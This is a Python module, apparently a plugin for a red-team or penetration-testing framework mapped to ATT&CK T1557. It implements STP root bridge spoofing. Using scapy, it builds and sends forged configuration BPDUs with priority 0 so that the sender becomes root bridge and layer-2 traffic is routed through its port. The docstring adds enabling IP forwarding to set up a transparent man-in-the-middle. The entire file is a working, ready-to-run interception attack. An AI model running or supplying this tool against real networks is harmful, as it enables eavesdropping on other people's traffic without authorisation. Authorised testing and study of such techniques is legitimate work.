"""
STP Root Bridge Spoofing — T1557

Sends STP Configuration BPDUs with bridge priority = 0 to win the root bridge
election. Once elected root, all L2 traffic must traverse the attacker's port,
enabling passive traffic capture.

Enable IP forwarding (echo 1 > /proc/sys/net/ipv4/ip_forward) alongside this
module for transparent MITM (traffic still reaches its destination).
"""
import time

from scapy.all import Dot3, Ether, LLC, STP, sendp

NAME = "stp"
DESCRIPTION = "STP root bridge spoofing — MITM entire L2 segment"
ATTCK_ID = "T1557"


# ── Framework interface ────────────────────────────────────────────────────────

def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(
        NAME,
        help=f"{DESCRIPTION} ({ATTCK_ID})",
        description=__doc__,
    )
    _add_args(p)
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    logger.info("START | technique=%s | iface=%s | priority=%d | count=%d",
                ATTCK_ID, args.interface, args.bridge_priority, args.count)
    ok = _execute(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1


# ── Argument definition ────────────────────────────────────────────────────────

def _add_args(p):
    p.add_argument("--interface", "-i", required=True)
    p.add_argument("--bridge-priority", type=int, default=0,
                   help="Bridge priority — lower value = higher priority "
                        "(default: 0 = guaranteed root)")
    p.add_argument("--count", "-c", type=int, default=10,
                   help="BPDUs to send (default 10 — enough to win election)")
    p.add_argument("--interval", type=float, default=1.0,
                   help="Seconds between BPDUs (default 1.0 — matches hello interval)")
    p.add_argument("--verbose", "-v", action="store_true")


# ── Core logic ────────────────────────────────────────────────────────────────

def _execute(args, logger=None):
    _log = logger.info if logger else print
    pkts = _gen_bpdus(args.count, args.bridge_priority)
    try:
        for i, pkt in enumerate(pkts):
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            _log(f"[STP] BPDU {i+1}/{len(pkts)} | priority={args.bridge_priority}")
            time.sleep(args.interval)
        _log("[STP] Done — capture STP on any other port to confirm root election")
        return True
    except Exception as e:
        _log(f"[STP] Error: {e}")
        return False


def _gen_bpdus(count: int, bridge_priority: int):
    return [
        Ether(dst="01:80:c2:00:00:00") /
        Dot3() /
        LLC(dsap=0x42, ssap=0x42, ctrl=3) /
        STP(
            proto=0, version=0, bpdutype=0, flags=0,
            rootid=bridge_priority, rootmac="00:00:00:00:00:01",
            pathcost=0,
            bridgeid=bridge_priority, bridgemac="00:00:00:00:00:01",
            portid=0x8001,
            age=0, maxage=20, hellotime=2, fwddelay=15,
        )
        for _ in range(count)
    ]
